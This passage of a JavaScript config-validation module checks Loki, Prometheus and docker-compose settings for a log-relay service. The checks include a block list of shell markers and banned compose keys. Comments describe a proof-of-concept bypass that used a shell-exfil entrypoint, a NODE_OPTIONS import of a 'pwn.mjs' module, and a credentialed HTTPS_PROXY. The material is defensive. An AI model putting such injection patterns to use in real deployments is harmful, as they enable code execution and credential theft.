  const close = alloyText.indexOf('}', open);
  if (open === -1 || close === -1) return null;
  const keys = [];
  for (const raw of alloyText.slice(open + 1, close).split('\n')) {
    const line = raw.trim();
    const eq = line.indexOf('=');
    if (eq <= 0) continue;
    const key = line.slice(0, eq).trim();
    if (key.length > 0) keys.push(key);
  }
  return keys;
}

/** Every `by (...)` grouping in a PromQL-bearing YAML text. */
export function promByClauses(text) {
  const groups = [];
  for (const opener of ['by (', 'by(']) {
    let from = 0;
    for (;;) {
      const at = text.indexOf(opener, from);
      if (at === -1) break;
      const close = text.indexOf(')', at);
      if (close === -1) return null;
      groups.push(
        text
          .slice(at + opener.length, close)
          .split(',')
          .map((s) => s.trim())
          .filter((s) => s.length > 0),
      );
      from = close + 1;
    }
  }
  return groups;
}

export function checkConnectionIdNotALabel(alloyText, recordingRulesText) {
  const labels = alloyStageLabelKeys(alloyText);
  if (labels === null || labels.length === 0) {
    return fail(
      'G9c: could not read a non-empty `stage.labels` block — a zero-label read vacuously ' +
        'satisfies "connection_id is not a label"',
    );
  }
  if (labels.includes('connection_id')) {
    return fail(
      'G9c (OBS-35/D12): `connection_id` is promoted to a Loki stream LABEL — that is one ' +
        'active series per session, which is the cardinality bomb D12 exists to stop. It is a ' +
        'log FIELD, filtered at query time.',
    );
  }
  const groups = promByClauses(stripHashComments(recordingRulesText));
  if (groups === null) return fail('G9c: an unterminated `by (` grouping — fail loud, not silent');
  if (groups.length === 0) {
    return fail(
      'G9c: zero `by (...)` groupings found in the recording rules — nothing was scanned',
    );
  }
  for (const group of groups) {
    if (group.includes('connection_id')) {
      return fail(
        'G9c (OBS-35/D12): a recording rule groups `by (connection_id)`, minting one recorded ' +
          'series per session',
      );
    }
  }
  return pass(
    `G9c: labels [${labels.join(', ')}] and ${groups.length} \`by (...)\` groupings, none ` +
      'carrying connection_id',
  );
}

// ===========================================================================
// G9d — the 4-stage fail-loud $trace_pair_set read
// ===========================================================================

/**
 * Stage 1 absent (null text) · 2 unparseable · 3 wrong schema or missing key ·
 * 4 a positively-read array. ABSENCE IS NOT THE EMPTY SET: a deleted or
 * unreadable config must fail, never read as "no reducers are instrumented"
 * (anti-pattern 1).
 */
export function readTracePairSet(textOrNull) {
  if (textOrNull === null || textOrNull === undefined) {
    return {
      ok: false,
      stage: 1,
      detail:
        `G9d stage 1: ${TRACE_PAIR_SET_REL} is absent. Absence is NOT the empty set — a deleted ` +
        'config would otherwise read as "nothing is instrumented" and every membership gate ' +
        'below would pass vacuously.',
    };
  }
  let parsed;
  try {
    parsed = JSON.parse(textOrNull);
  } catch (err) {
    return {
      ok: false,
      stage: 2,
      detail: `G9d stage 2: ${TRACE_PAIR_SET_REL} does not parse as JSON: ${err.message}`,
    };
  }
  if (parsed === null || typeof parsed !== 'object' || Array.isArray(parsed)) {
    return { ok: false, stage: 3, detail: 'G9d stage 3: the config is not a JSON object' };
  }
  if (parsed.schema !== 1) {
    return {
      ok: false,
      stage: 3,
      detail: `G9d stage 3: schema is ${JSON.stringify(parsed.schema)}, expected 1`,
    };
  }
  if (!Object.hasOwn(parsed, 'trace_pair_set')) {
    return {
      ok: false,
      stage: 3,
      detail:
        'G9d stage 3: the `trace_pair_set` key is ABSENT. An absent key and an empty array are ' +
        'different facts and must not collapse into one.',
    };
  }
  if (!Array.isArray(parsed.trace_pair_set)) {
    return {
      ok: false,
      stage: 3,
      detail: 'G9d stage 3: `trace_pair_set` is present but is not an array',
    };
  }
  for (const entry of parsed.trace_pair_set) {
    if (typeof entry !== 'string' || entry.trim().length === 0) {
      return {
        ok: false,
        stage: 3,
        detail: `G9d stage 3: membership entry ${JSON.stringify(entry)} is not a reducer name`,
      };
    }
  }
  const names = [...parsed.trace_pair_set];
  return {
    ok: true,
    stage: 4,
    names,
    set: new Set(names),
    detail: `G9d stage 4: positively read ${names.length} member(s): [${names.join(', ')}]`,
  };
}

// ===========================================================================
// G9e — banned membership ($slo_set PARSED, bench ids READ, movement_tick)
// ===========================================================================

/** Parse EVERY `reducer=~"a|b|c"` matcher; AM11 requires them to agree. */
export function parseSloSet(recordingRulesText) {
  const needle = 'reducer=~"';
  const occurrences = [];
  let from = 0;
  for (;;) {
    const at = recordingRulesText.indexOf(needle, from);
    if (at === -1) break;
    const start = at + needle.length;
    const end = recordingRulesText.indexOf('"', start);
    if (end === -1) {
      return fail(
        'G9e: a `reducer=~"` matcher is never closed — the $slo_set cannot be parsed, and a ' +
          'silently-empty parse would make the banned-membership check vacuous',
      );
    }
    const names = recordingRulesText
      .slice(start, end)
      .split('|')
      .map((s) => s.trim())
      .filter((s) => s.length > 0);
    if (names.length === 0) {
      return fail('G9e: a `reducer=~"..."` matcher parsed to ZERO names — fail loud, never empty');
    }
    occurrences.push(names);
    from = end + 1;
  }
  if (occurrences.length < 2) {
    return fail(
      `G9e (AM11): found ${occurrences.length} \`reducer=~\` matcher(s); recording.rules.yml ` +
        'carries the $slo_set twice (committed + total) and BOTH must be parsed — reading one ' +
        'copy cannot detect the two drifting apart',
    );
  }
  const canonical = [...occurrences[0]].sort().join('|');
  for (const names of occurrences) {
    if ([...names].sort().join('|') !== canonical) {
      return fail(
        `G9e (AM11): the $slo_set matcher copies DISAGREE: [${canonical}] vs ` +
          `[${[...names].sort().join('|')}] — the SSOT has already drifted`,
      );
    }
  }
  return {
    ok: true,
    names: [...occurrences[0]],
    occurrences: occurrences.length,
    detail: `G9e: ${occurrences.length} agreeing $slo_set matchers, ${occurrences[0].length} names`,
  };
}

/** The criterion bench ids, READ from game-core/benches/budgets.rs. */
export function benchIds(budgetsRsText) {
  const needle = 'id: "';
  const ids = [];
  let from = 0;
  for (;;) {
    const at = budgetsRsText.indexOf(needle, from);
    if (at === -1) break;
    const start = at + needle.length;
    const end = budgetsRsText.indexOf('"', start);
    if (end === -1) return fail('G9e: an unterminated bench id literal in budgets.rs');
    const id = budgetsRsText.slice(start, end).trim();
    if (id.length === 0) return fail('G9e: an empty bench id literal in budgets.rs');
    ids.push(id);
    from = end + 1;
  }
  if (ids.length !== 7) {
    return fail(
      `G9e (OBS-5/D7): read ${ids.length} criterion bench ids from budgets.rs, expected 7 — a ` +
        'short read would let a benched reducer slip into $trace_pair_set',
    );
  }
  return { ok: true, ids, detail: `G9e: 7 bench ids read: ${ids.join(', ')}` };
}

export function checkBannedMembership(configNames, bannedNames) {
  if (bannedNames.length === 0) {
    return fail('G9e: the banned set is empty — nothing could be excluded, which is never green');
  }
  const banned = new Set(bannedNames);
  const offenders = configNames.filter((n) => banned.has(n));
  if (offenders.length > 0) {
    return fail(
      `G9e (OBS-50): \`${offenders.join(', ')}\` is in $trace_pair_set but is banned — ` +
        '$trace_pair_set may never contain movement_tick, a $slo_set member, or a ' +
        'criterion-benched hot path (breadcrumb overhead would be measured as an SLO regression)',
    );
  }
  return pass(
    `G9e: ${configNames.length} member(s) intersect the ${banned.size}-name banned set in 0 places`,
  );
}

// ===========================================================================
// G9f — reducers that actually carry a paired enter/exit breadcrumb
// ===========================================================================

// The needles are ASSEMBLED, never spelled contiguously, so this file cannot
// satisfy any crate-wide or repo-wide scan with its own text (the
// observability_tests.rs `concat!` idiom, :945-946).
const DQ = String.fromCharCode(34);
const ENTER_NEEDLE = `Some(${DQ}enter${DQ})`;
const EXIT_NEEDLE = `Some(${DQ}exit${DQ})`;
const REDUCER_ATTR = '#[spacetimedb::reducer';

/** Blank out whole-line `//` comments so a doc MENTION is never a call site. */
function scrubCommentLines(src) {
  return src
    .split('\n')
    .map((line) => (line.trimStart().startsWith('//') ? '' : line))
    .join('\n');
}

/**
 * AM5 — "paired reducer" means BOTH literals inside ONE reducer function's
 * body, found by brace-tracking (the observability_tests.rs `fn_body` idiom).
 * A file-wide `contains(enter) && contains(exit)` would call two unrelated
 * reducers a pair; the T-c negative control proves this one does not.
 *
 * `orphans` closes the granularity blind spot: a phase literal OUTSIDE any
 * reducer body cannot be attributed to a reducer name, so it is reported rather
 * than silently dropped.
 */
export function pairedReducers(srcMap) {
  const paired = new Set();
  const orphans = [];
  let reducersScanned = 0;
  let attrsSeen = 0;

  for (const file of Object.keys(srcMap).sort()) {
    const src = scrubCommentLines(srcMap[file]);
    const bodies = [];

    // Counted from the SAME scrubbed text the walk reads, so `attrsSeen !==
    // reducersScanned` means the brace tracking derailed (an unbalanced brace
    // inside a string literal is the realistic cause) rather than that the tree
    // changed. A derailed walk silently stops finding call sites, which is
    // exactly the vacuous-green G9f must not have.
    let attrFrom = 0;
    for (;;) {
      const at = src.indexOf(REDUCER_ATTR, attrFrom);
      if (at === -1) break;
      attrsSeen++;
      attrFrom = at + REDUCER_ATTR.length;
    }

    let from = 0;
    for (;;) {
      const attr = src.indexOf(REDUCER_ATTR, from);
      if (attr === -1) break;
      const fnAt = src.indexOf('fn ', attr);
      if (fnAt === -1) break;
      let nameEnd = fnAt + 3;
      while (nameEnd < src.length) {
        const c = src[nameEnd];
        const wordish = isAsciiLetter(c) || (c >= '0' && c <= '9') || c === '_';
        if (!wordish) break;
        nameEnd++;
      }
      const name = src.slice(fnAt + 3, nameEnd).trim();
      const open = src.indexOf('{', nameEnd);
      if (open === -1) break;
      let depth = 0;
      let close = -1;
      for (let i = open; i < src.length; i++) {
        if (src[i] === '{') depth++;
        else if (src[i] === '}') {
          depth--;
          if (depth === 0) {
            close = i;
            break;
          }
        }
      }
      if (close === -1) break;
      reducersScanned++;
      const body = src.slice(open + 1, close);
      bodies.push([open, close]);
      if (body.includes(ENTER_NEEDLE) && body.includes(EXIT_NEEDLE)) paired.add(name);
      from = close;
    }

    for (const needle of [ENTER_NEEDLE, EXIT_NEEDLE]) {
      let at = src.indexOf(needle);
      while (at !== -1) {
        const inside = bodies.some(([open, close]) => at > open && at < close);
        if (!inside) orphans.push({ file, literal: needle === ENTER_NEEDLE ? 'enter' : 'exit' });
        at = src.indexOf(needle, at + needle.length);
      }
    }
  }

  return { paired: [...paired].sort(), reducersScanned, attrsSeen, orphans };
}

/** OBS-50's SSOT extension: neither a superset nor a subset, reported apart. */
export function checkExactSetEquality(configNames, scannedNames) {
  const configSet = new Set(configNames);
  const scannedSet = new Set(scannedNames);
  const configOnly = configNames.filter((n) => !scannedSet.has(n)).sort();
  const sourceOnly = scannedNames.filter((n) => !configSet.has(n)).sort();
  if (configOnly.length === 0 && sourceOnly.length === 0) {
    return pass(
      `G9f (OBS-50): $trace_pair_set and the scanned call sites are the SAME set of ` +
        `${configSet.size} reducer(s)`,
    );
  }
  const clauses = [];
  if (configOnly.length > 0) {
    clauses.push(
      `SUPERSET: [${configOnly.join(', ')}] are in $trace_pair_set but NO reducer body carries ` +
        'a paired enter/exit breadcrumb for them (the config promises spans that will never exist)',
    );
  }
  if (sourceOnly.length > 0) {
    clauses.push(
      `SUBSET: [${sourceOnly.join(', ')}] carry a paired enter/exit breadcrumb but are NOT in ` +
        '$trace_pair_set (the relay will drop their crumbs; the instrumentation is dead weight)',
    );
  }
  return fail(`G9f (OBS-50 SSOT extension, spec:652-655): ${clauses.join(' | ')}`);
}

// ===========================================================================
// G9n/G9o/G9p — the GRADUATED P1-P4 assertions (13r-b; OBS-45/OBS-46)
//
// These three functions REPLACE the m20e-2 park tripwire's `checkNoRelayScrapeJob`
// and `checkNoRelayAlertRule`. They are deliberately NEW NAMES rather than the
// old ones with their polarity inverted: a predicate called "checkNoRelayX" that
// now requires X is a trap for every future reader, and grep for the old names
// should turn up nothing rather than something that means the opposite.
//
// Every one of them is SCOPED — to a compose service block, to a `volumes:`
// sub-block, to `scrape_configs:`, to a single `- uid:` rule — because the
// defect class here is co-occurrence read as wiring. Three measured examples:
//   * `checkNoExecLogSource` (checks/stack-config-checks.mjs:539-570) is
//     hardcoded to the `alloy` service, so a relay block carrying a shell-exfil
//     `entrypoint:`, an `env_file:`, `NODE_OPTIONS=--import=/opt/relay/pwn.mjs`,
//     `NODE_USE_ENV_PROXY=1`, an `HTTPS_PROXY` with credentials in it and an
//     `MR_RELAY_KEY` passed C3, C5, C6, C7 AND C17 (PoC'd).
//   * a file-wide `indexOf('--web.listen-address=')` over docker-compose.yml
//     returns PROMETHEUS's `127.0.0.1:9090` (docker-compose.yml:51 is the first
//     occurrence), so an unscoped G9o would compare the relay's scrape port
//     against the wrong service's flag and pass a broken target.
//   * `AlloyDown` thresholds via an `__expr__` node, NOT in its expr
//     (rules.yml:59-69), so a relay rule with a `gt` evaluator, `isPaused: true`
//     or a dangling `condition:` refId satisfies "the expr mentions the relay"
//     and never fires.
// ===========================================================================

const ALLOY_JOB_MATCHER = `job=${DQ}alloy${DQ}`;
const ALLOY_UP_NEEDLE = `up{${ALLOY_JOB_MATCHER}}`;
const RELAY_JOB_MATCHER = `job=${DQ}${RELAY_SERVICE_NAME}${DQ}`;
const RELAY_UP_NEEDLE = `up{${RELAY_JOB_MATCHER}}`;

/** Exactly one `key:` at `indent`; anything else is a fail-loud result. */
function scopedScalar(lines, key, indent, where) {
  const idx = keyIndices(lines, key, indent);
  if (idx.length !== 1) {
    return fail(`${where} declares ${idx.length} \`${key}:\` keys; exactly 1 is required`);
  }
  return { ok: true, value: scalarOf(lines[idx[0]], key), index: idx[0] };
}

/** Exactly one `key:` at `indent`, returning its sub-block plus its own index. */
function scopedBlock(lines, key, indent, where) {
  const idx = keyIndices(lines, key, indent);
  if (idx.length !== 1) {
    return fail(`${where} declares ${idx.length} \`${key}:\` blocks; exactly 1 is required`);
  }
  return { ok: true, lines: subBlock(lines, idx[0]), index: idx[0] };
}

/**
 * Split a compose SHORT-FORM mount item on its TOP-LEVEL `:` separators — i.e.
 * ignoring the ones inside a `${VAR:-default}` interpolation.
 *
 * Alloy's own replicas mount is
 * `${MR_SPACETIME_DATA_DIR:-/var/lib/spacetime}/replicas:/data/module-logs:ro`,
 * whose SOURCE half itself contains `:-`. A naive `split(':')` yields four
 * fragments, reads `-/var/lib/spacetime}/replicas` as the container target and
 * `/data/module-logs` as the mode — i.e. it silently mis-reads every mount in
 * this file that uses an env default, which is the only one that matters here.
 */
function splitMountItem(item) {
  const parts = [];
  let current = '';
  let depth = 0;
  for (let i = 0; i < item.length; i++) {
    const ch = item[i];
    if (ch === '$' && item[i + 1] === '{') {
      depth++;
      current += '${';
      i++;
      continue;
    }
    if (ch === '}' && depth > 0) {
      depth--;
      current += ch;
      continue;
    }
    if (ch === ':' && depth === 0) {
      parts.push(current);
      current = '';
      continue;
    }
    current += ch;
  }
  parts.push(current);
  return parts;
}

/** A flow-style `['a', 'b']` scalar list. null when it is not flow style. */
function flowListItems(raw) {
  const t = raw.trim();
  if (!t.startsWith('[') || !t.endsWith(']')) return null;
  const inner = t.slice(1, -1).trim();
  if (inner.length === 0) return [];
  return inner.split(',').map((piece) => scalarOf(`x: ${piece.trim()}`, 'x'));
}

// ---------------------------------------------------------------------------
// G9n — the relay's own bind mount, and the relay block as an ALLOWLIST
// ---------------------------------------------------------------------------

/**
 * Mirrors `SHELL_MARKERS` at checks/stack-config-checks.mjs:517. It is copied
 * rather than imported because the module does not export it, and because the
 * predicate that uses it there is hardcoded to the `alloy` service — importing
 * the check would inherit exactly the scoping bug this gate exists to close.
 * If that list gains a marker, add it here in the same change.
 */
const RELAY_SHELL_MARKERS = [
  '/bin/sh',
  '/bin/bash',
  'sh -c',
  'bash -c',
  'tail -F',
  'tail -f',
  ' | ',
];

/**
 * AM16(d): the relay's accepted flag set is EXACTLY these three. An allowlist
 * beats enumerating credential-ish names (`--token`, `--api-key`, ...): those
 * can always be spelled one way the list did not anticipate, while an unknown
 * flag of ANY name fails this.
 *
 * `--web.listen-address` is not a free choice: `LISTEN_FLAGS`
 * (checks/stack-config-checks.mjs:448-454) is a hardcoded 5-entry list and
 * `checkListenAddrsLoopback` FAILS CLOSED (:494-499) for a service matching
 * none of them, so a natural `--health-listen-addr=` would red C6. It is also
 * the Prometheus-ecosystem convention and the relay IS a scrape target — the
 * checker compatibility is a consequence, not the reason. Recorded in ADR-0191
 * with the right follow-up (per-service binding sources, eval:97-107).
 */
const RELAY_COMMAND_FLAGS = ['--logs-dir', '--web.listen-address', '--trace-pair-set'];

/**
 * Keys the relay service may not declare AT ALL, each with its own reason:
 *   entrypoint — REPLACES the node binary outright; no marker list can bound
 *                what a replaced entrypoint does (the checks module says the
 *                same thing about alloy at :543-550, for the same reason).
 *   env_file   — smuggles arbitrary environment in from a file no single-file
 *                detector reads, exactly as `extends:` does for compose keys.
 *   environment — not "no credential-shaped env var": NO env block at all. The
 *                node runtime reads `NODE_OPTIONS`, `NODE_USE_ENV_PROXY`,
 *                `HTTPS_PROXY` and friends from the environment, so a
 *                denylist of names is unclosable here. The relay's entire
 *                configuration surface is its three command flags.
 */
const RELAY_BANNED_KEYS = ['entrypoint', 'env_file', 'environment'];

/** The `command:` list items of the relay service, scoped and fail-loud. */
function relayCommandItems(composeText) {
  const block = composeServiceBlockScoped(composeText, RELAY_SERVICE_NAME);
  if (!block.ok) return fail(`the \`${RELAY_SERVICE_NAME}\` service — ${block.detail}`);
  const idx = keyIndices(block.lines, 'command', 4);
  if (idx.length !== 1) {
    return fail(
      `the \`${RELAY_SERVICE_NAME}\` service declares ${idx.length} \`command:\` keys; exactly 1 ` +
        'is required. A missing command hands the container the image default, which for ' +
        '`node:*-alpine` is a REPL.',
    );
  }
  if (scalarOf(block.lines[idx[0]], 'command').length > 0) {
    return fail(
      `the \`${RELAY_SERVICE_NAME}\` service's \`command:\` is inline/flow style, which this ` +
        'scanner cannot read — fail loud rather than compare against a partial parse',
    );
  }
  const items = scalarListUnder(block.lines, idx[0]);
  if (!items.ok)
    return fail(`the \`${RELAY_SERVICE_NAME}\` service's \`command:\` — ${items.detail}`);
  if (items.values.length === 0) {
    return fail(`the \`${RELAY_SERVICE_NAME}\` service's \`command:\` declares ZERO items`);
  }
  return { ok: true, values: items.values, blockLines: block.lines };
}

/** The `=`-joined value of one relay command flag, fail-loud on 0 or >1. */
function relayFlagValue(items, flag) {
  const prefix = `${flag}=`;
  const matches = items.filter((i) => i.startsWith(prefix));
  if (matches.length !== 1) {
    return fail(
      `the \`${RELAY_SERVICE_NAME}\` service declares ${matches.length} \`${prefix}\` command ` +
        'items; exactly 1 is required, in the `=`-joined form (a space-separated pair becomes a ' +
        'separate list item that `checkListenAddrsLoopback` cannot associate with its flag)',
    );
  }
  return { ok: true, value: matches[0].slice(prefix.length) };
}

export function checkRelayMountMirrorsAlloy(composeText) {
  // 1. Alloy's replicas mount SOURCE — read, never re-spelled. OBS-45 says "the
  //    same read-only bind mount as Alloy", and "the same" is a claim about the
  //    HOST path: if that path moves, both services move together or neither is
  //    reading what the other reads.
  const alloy = composeServiceBlockScoped(composeText, 'alloy');
  if (!alloy.ok) return fail(`G9n: the alloy service — ${alloy.detail}`);
  const alloyVolumes = scopedBlock(alloy.lines, 'volumes', 4, 'G9n: the alloy service');
  if (!alloyVolumes.ok) return fail(`G9n: ${alloyVolumes.detail}`);
  const alloyMounts = scalarListUnder(alloy.lines, alloyVolumes.index);
  if (!alloyMounts.ok) return fail(`G9n: alloy's \`volumes:\` — ${alloyMounts.detail}`);
  const alloyReplicas = alloyMounts.values.filter((v) => splitMountItem(v)[0].includes('replicas'));
  if (alloyReplicas.length !== 1) {
    return fail(
      `G9n: the alloy service declares ${alloyReplicas.length} \`replicas\`-sourced mounts; ` +
        "exactly 1 is required, because this gate DERIVES the relay's expected mount source from " +
        'it rather than re-spelling the path here',
    );
  }
  const alloySource = splitMountItem(alloyReplicas[0])[0];

  // 2. The relay block itself, as an allowlist rather than a checklist.
  const relay = composeServiceBlockScoped(composeText, RELAY_SERVICE_NAME);
  if (!relay.ok) {
    return fail(
      `G9n (OBS-45/OBS-46): the \`${RELAY_SERVICE_NAME}\` service — ${relay.detail}. This slice ` +
        'lands the service, its scrape target and its alert rule in ONE change: shipping the ' +
        'config without the process pins up=0 forever.',
    );
  }
  for (const banned of RELAY_BANNED_KEYS) {
    if (keyIndices(relay.lines, banned, 4).length > 0) {
      return fail(
        `G9n (OBS-45): the \`${RELAY_SERVICE_NAME}\` service declares \`${banned}:\`. This block ` +
          'is NOT covered by checkNoExecLogSource (C7), which is hardcoded to the `alloy` service ' +
          '(checks/stack-config-checks.mjs:539-570) — a relay block with a shell-exfil ' +
          '`entrypoint:`, an `env_file:` and an `HTTPS_PROXY`/`NODE_OPTIONS` environment passed ' +
          "C3, C5, C6, C7 AND C17 when this was PoC'd. The relay's entire configuration surface " +
          `is its ${RELAY_COMMAND_FLAGS.length} command flags; there is nothing for an ` +
          'environment block to legitimately carry.',
      );
    }
  }
  const relayText = relay.lines.join('\n');
  const marker = RELAY_SHELL_MARKERS.find((m) => relayText.includes(m));
  if (marker !== undefined) {
    return fail(
      `G9n (OBS-11/OBS-45): the \`${RELAY_SERVICE_NAME}\` service block contains \`${marker}\` — ` +
        'a shell pipeline there reaches the module logs OUTSIDE everything this eval reads, which ' +
        'is the banned subprocess log source wearing a different service name',
    );
  }

  // 3. The mount: same SOURCE as alloy's, read-only, and the logs dir inside it.
  const relayVolumes = scopedBlock(
    relay.lines,
    'volumes',
    4,
    `G9n: the \`${RELAY_SERVICE_NAME}\` service`,
  );
  if (!relayVolumes.ok) {
    return fail(
      `G9n (OBS-45/P2): ${relayVolumes.detail}. NOTE: C5 (checkModuleLogsMountReadOnly) cannot ` +
        'catch this — its only non-vacuity floor is `found === 0` ' +
        '(checks/stack-config-checks.mjs:436), so a relay with NO mount at all still leaves ' +
        "alloy's one and C5 passes. This gate is what proves the relay HAS the mount.",
    );
  }
  const relayMounts = scalarListUnder(relay.lines, relayVolumes.index);
  if (!relayMounts.ok) {
    return fail(
      `G9n: the \`${RELAY_SERVICE_NAME}\` service's \`volumes:\` — ${relayMounts.detail}`,
    );
  }
  if (relayMounts.values.length === 0) {
    return fail(
      `G9n (OBS-45/P2): the \`${RELAY_SERVICE_NAME}\` service declares a \`volumes:\` key with ` +
        'ZERO mounts — nothing was compared',
    );
  }
  const matching = relayMounts.values.filter((v) => splitMountItem(v)[0] === alloySource);
  if (matching.length !== 1) {
    const sources = relayMounts.values.map((v) => splitMountItem(v)[0]);
    return fail(
      `G9n (OBS-45/P2): the \`${RELAY_SERVICE_NAME}\` service declares ${matching.length} mounts ` +
        `whose SOURCE half is string-equal to alloy's \`${alloySource}\`; exactly 1 is required. ` +
        `Its mount sources are [${sources.join(', ')}]. OBS-45 says the relay reads the module ` +
        'logs "via the SAME read-only bind mount as Alloy": a second host path that happens to ' +
        'hold a copy of the same files is not the same mount, and it drifts the first time either ' +
        'side is re-pointed.',
    );
  }
  const parts = splitMountItem(matching[0]);
  if (parts.length !== 3 || parts[2] !== 'ro' || !matching[0].endsWith(':ro')) {
    return fail(
      `G9n (OBS-45/P2): the relay's replicas mount is \`${matching[0]}\`, which is not \`:ro\`. A ` +
        'bare short-form mount defaults to READ-WRITE in Docker, so omission is the trap: the ' +
        'relay would hold a writable handle on the SpacetimeDB data directory, which is exactly ' +
        'what OBS-45 forbids.',
    );
  }
  const target = parts[1];
  if (target.length === 0 || !target.startsWith('/')) {
    return fail(`G9n: the relay's replicas mount has an unreadable container target \`${target}\``);
  }

  // 4. The command: an exact flag allowlist, and --logs-dir INSIDE the mount.
  const cmd = relayCommandItems(composeText);
  if (!cmd.ok) return fail(`G9n: ${cmd.detail}`);
  if (cmd.values[0] !== 'node') {
    return fail(
      `G9n (AM5): the relay's \`command:\` begins with \`${cmd.values[0]}\`, expected \`node\`. ` +
        'The `node:*-alpine` entrypoint does `set -- node "$@"` only when $1 does NOT start with ' +
        '`-`; a bare `--web.listen-address=...` as the first item is therefore parsed as a NODE ' +
        'CLI option and the container dies on start. Use the full list form ' +
        '(`node`, `/opt/relay/daemon.mjs`, then the flags) and still NO `entrypoint:`.',
    );
  }
  const flagNames = cmd.values
    .filter((v) => v.startsWith('--'))
    .map((v) => (v.indexOf('=') === -1 ? v : v.slice(0, v.indexOf('='))));
  const unexpected = flagNames.filter((f) => !RELAY_COMMAND_FLAGS.includes(f));
  const missingFlags = RELAY_COMMAND_FLAGS.filter((f) => !flagNames.includes(f));
  if (
    unexpected.length > 0 ||
    missingFlags.length > 0 ||
    flagNames.length !== new Set(flagNames).size
  ) {
    return fail(
      `G9n (OBS-45, AM16(d)): the relay's command flag names are [${flagNames.join(', ')}], ` +
        `expected EXACTLY [${RELAY_COMMAND_FLAGS.join(', ')}] — unexpected ` +
        `[${unexpected.join(', ') || 'none'}], missing [${missingFlags.join(', ') || 'none'}]. ` +
        'This is an allowlist and not a credential-name denylist because a denylist is ' +
        'unclosable: `--token`, `--api-key`, `--auth`, `--secret-file` and whatever comes next ' +
        'all have to be enumerated, while an allowlist rejects the one nobody thought of. ' +
        'OBS-45 forbids the relay ACCEPTING a module-owner credential, and accepting begins here.',
    );
  }
  const logsDir = relayFlagValue(cmd.values, '--logs-dir');
  if (!logsDir.ok) return fail(`G9n: ${logsDir.detail}`);
  if (logsDir.value !== target && !logsDir.value.startsWith(`${target}/`)) {
    return fail(
      `G9n (OBS-45): the relay reads \`--logs-dir=${logsDir.value}\`, which is NOT inside its ` +
        `read-only mount's container target \`${target}\`. A correct \`:ro\` mount the process ` +
        'never actually reads from proves nothing at all: this is the clause that ties the mount ' +
        'to the code path.',
    );
  }

  return pass(
    `G9n (OBS-45): the \`${RELAY_SERVICE_NAME}\` service mounts alloy's own \`${alloySource}\` ` +
      `at \`${target}\` read-only, reads \`--logs-dir=${logsDir.value}\` from inside it, declares ` +
      `none of [${RELAY_BANNED_KEYS.join(', ')}], carries no shell marker, and accepts exactly ` +
      `[${RELAY_COMMAND_FLAGS.join(', ')}]`,
  );
}

// ---------------------------------------------------------------------------
// G9o — the scrape target, cross-resolved against the compose listen flag
// ---------------------------------------------------------------------------

export function checkRelayScrapeJobWired(prometheusYmlText, composeText) {
  // The port comes from the RELAY's own scoped block. A file-wide
  // `indexOf('--web.listen-address=')` over docker-compose.yml returns
  // prometheus's `127.0.0.1:9090` (:51 is the first occurrence), so an unscoped
  // read would compare the scrape target against the wrong service and call a
  // broken target correct.
  const cmd = relayCommandItems(composeText);
  if (!cmd.ok) return fail(`G9o (OBS-46/P3): ${cmd.detail}`);
  const listen = relayFlagValue(cmd.values, '--web.listen-address');
  if (!listen.ok) return fail(`G9o: ${listen.detail}`);
  const listenParts = listen.value.split(':');
  if (listenParts.length !== 2) {
    return fail(`G9o: the relay binds \`${listen.value}\`, which is not <host>:<port>`);
  }
  const composePort = toInt(listenParts[1]);
  if (listenParts[0] !== '127.0.0.1' || composePort === null) {
    return fail(
      `G9o: the relay binds \`${listen.value}\` — this gate needs a numeric loopback <host>:<port> ` +
        'to cross-check the scrape target against (C6 owns the loopback rule itself)',
    );
  }

  // The job must resolve INSIDE `scrape_configs:`. A top-level `x-parked:` key
  // holding a structurally perfect job satisfies a flat line scan while
  // Prometheus never scrapes it — the AM17 decoy shape, one file over.
  const lines = stripHashComments(prometheusYmlText).split('\n');
  const roots = [];
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].startsWith('scrape_configs:')) roots.push(i);
  }
  if (roots.length !== 1) {
    return fail(
      `G9o: expected exactly one column-0 \`scrape_configs:\` key, found ${roots.length}`,
    );
  }
  if (lines[roots[0]].slice('scrape_configs:'.length).trim().length > 0) {
    return fail('G9o: `scrape_configs:` uses inline/flow style, which this scanner cannot read');
  }
  const jobs = listItems(subBlock(lines, roots[0]));
  if (jobs.length === 0) {
    return fail('G9o: `scrape_configs:` declares ZERO jobs — nothing was scanned');
  }

  const named = [];
  const relayJobs = [];
  for (const job of jobs) {
    const ji = indentOf(job[0]);
    const nameRes = scopedScalar(job, 'job_name', ji, 'G9o: a scrape job');
    if (!nameRes.ok) return fail(nameRes.detail);
    named.push(nameRes.value);
    if (nameRes.value === RELAY_SERVICE_NAME) relayJobs.push({ lines: job, indent: ji });
  }
  if (relayJobs.length !== 1) {
    const decoyed =
      relayJobs.length === 0 &&
      stripHashComments(prometheusYmlText).includes(`job_name: ${RELAY_SERVICE_NAME}`);
    return fail(
      `G9o (OBS-46/P3): found ${relayJobs.length} \`job_name: ${RELAY_SERVICE_NAME}\` jobs INSIDE ` +
        `\`scrape_configs:\`; exactly 1 is required. Jobs found: [${named.join(', ')}].` +
        (decoyed
          ? ' The name DOES appear elsewhere in prometheus.yml, under a key that is not ' +
            '`scrape_configs:` — Prometheus ignores it entirely, so a flat line scan would call ' +
            'this wired while the target is never scraped.'
          : ' OBS-46 requires Prometheus to scrape the relay as ITS OWN target.'),
    );
  }
  const job = relayJobs[0];

  const metricsPath = scopedScalar(
    job.lines,
    'metrics_path',
    job.indent,
    `G9o: the \`${RELAY_SERVICE_NAME}\` scrape job`,
  );
  if (!metricsPath.ok) {
    return fail(
      `${metricsPath.detail}. Prometheus DEFAULTS to \`/metrics\` when the key is absent, so ` +
        'omission is silent: the relay serves /health, the scrape 404s, `up` goes to 0 and the ' +
        "dead-man's switch sits permanently firing — the exact failure the m20e-2 park warned " +
        'about, arrived by omission rather than by intent.',
    );
  }
  if (metricsPath.value !== '/health') {
    return fail(
      `G9o (OBS-46): the \`${RELAY_SERVICE_NAME}\` job scrapes \`${metricsPath.value}\`, expected ` +
        '`/health` — that is the endpoint OBS-46 names and the only one the daemon serves',
    );
  }

  const statics = scopedBlock(
    job.lines,
    'static_configs',
    job.indent,
    `G9o: the \`${RELAY_SERVICE_NAME}\` scrape job`,
  );
  if (!statics.ok) return fail(statics.detail);
  const staticItems = listItems(statics.lines);
  if (staticItems.length !== 1) {
    return fail(
      `G9o: the \`${RELAY_SERVICE_NAME}\` job declares ${staticItems.length} \`static_configs\` ` +
        'entries; exactly 1 is required so the entry this gate reads is the entry Prometheus uses',
    );
  }
  const targetsRes = scopedScalar(
